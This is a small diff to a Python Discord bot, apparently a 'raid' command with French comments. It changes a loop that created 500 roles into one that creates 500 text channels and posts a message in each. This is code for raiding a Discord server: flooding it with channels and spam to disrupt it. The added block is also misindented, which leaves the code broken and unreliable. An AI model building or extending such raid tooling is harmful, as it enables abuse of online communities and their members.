@@ -79,7 +79,12 @@ async def raid_2(
     # rôles
     try:
         for i in range(500):
-            await guild.create_role(name=f"{nom_role}-{i + 1}")
+            channel = await guild.create_text_channel(name=f"{nom}-{i+1}")
+
+try:
+    await channel.send("bonjour")
+except:
+    pass
     except Exception as e:
         await interaction.edit_original_response(
             content=f"❌ Erreur rôles : {e}"
